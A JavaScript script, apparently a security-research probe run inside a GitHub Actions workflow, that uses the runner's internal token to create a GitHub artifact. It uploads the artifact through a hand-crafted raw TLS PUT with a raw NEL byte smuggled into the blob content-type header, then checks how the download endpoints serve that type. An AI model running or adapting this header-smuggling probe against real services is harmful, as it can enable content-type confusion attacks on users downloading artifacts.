const tls = require('tls');

module.exports = async function probe({context}) {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const results = process.env.ACTIONS_RESULTS_URL;
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
  const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
  const [, run, job] = scope.split(':');
  const ids = {workflow_run_backend_id: run, workflow_job_run_backend_id: job};
  const base = `${new URL(results).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
  const name = `legacy-mime-${Date.now()}`;
  const body = Buffer.from('{"hello":"test"}');

  async function twirp(method, payload) {
    const response = await fetch(base + method, {
      method: 'POST',
      headers: {Authorization: `Bearer ${token}`, 'Content-Type': 'application/json'},
      body: JSON.stringify(payload),
    });
    return {status: response.status, data: await response.json().catch(() => ({}))};
  }

  const created = await twirp('CreateArtifact', {...ids, name, version: 7, mime_type: 'application/json'});
  console.log('create', created.status, Boolean(created.data.ok));
  if (!created.data.ok) return;
  const uploadUrl = new URL(created.data.signed_upload_url || created.data.signedUploadUrl);
  console.log('upload permissions', uploadUrl.searchParams.get('sp'));

  // Send exactly one raw NEL byte in the Azure Blob property over TLS.
  const prefix = Buffer.from(
    `PUT ${uploadUrl.pathname}${uploadUrl.search} HTTP/1.1\r\n` +
    `Host: ${uploadUrl.host}\r\n` +
    `Connection: close\r\n` +
    `x-ms-version: 2025-01-05\r\n` +
    `x-ms-blob-type: BlockBlob\r\n` +
    `x-ms-blob-content-type: application/json`, 'ascii');
  const suffix = Buffer.from(`\r\nContent-Length: ${body.length}\r\n\r\n`, 'ascii');
  const request = Buffer.concat([prefix, Buffer.from([0x85]), suffix, body]);
  const raw = await new Promise((resolve, reject) => {
    const socket = tls.connect(443, uploadUrl.hostname, {servername: uploadUrl.hostname});
    const chunks = [];
    socket.setTimeout(20000, () => socket.destroy(new Error('timeout')));
    socket.once('secureConnect', () => socket.write(request));
    socket.on('data', chunk => chunks.push(chunk));
    socket.once('error', reject);
    socket.once('end', () => resolve(Buffer.concat(chunks).toString('latin1')));
  });
  console.log('raw PUT response', raw.split('\r\n', 1)[0]);
  if (!/^HTTP\/1\.1 201\b/.test(raw)) return;

  const head = await fetch(uploadUrl, {method: 'HEAD'});
  console.log('upload SAS HEAD', head.status, JSON.stringify(head.headers.get('content-type')));

  const finalized = await twirp('FinalizeArtifact', {...ids, name, size: String(body.length)});
  const id = String(finalized.data.artifact_id || finalized.data.artifactId || '');
  console.log('finalize', finalized.status, Boolean(finalized.data.ok), /^\d+$/.test(id) ? id : 'none');
  if (!finalized.data.ok || !/^\d+$/.test(id)) return;

  const api = `https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/artifacts/${id}/zip`;
  const redirect = await fetch(api, {
    redirect: 'manual',
    headers: {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github.v3+json'},
  });
  const location = redirect.headers.get('location');
  console.log('REST', redirect.status, location ? new URL(location).searchParams.get('rsct') : 'none');
  if (!location) return;
  for (const version of [null, '2009-09-19', '2011-08-18', '2013-08-15']) {
    const url = new URL(location);
    if (version) url.searchParams.set('api-version', version);
    const response = await fetch(url);
    const type = response.headers.get('content-type');
    console.log('GET version', version || '(default)', response.status, JSON.stringify(type), type && Buffer.from(type, 'latin1').toString('hex'));
  }
};
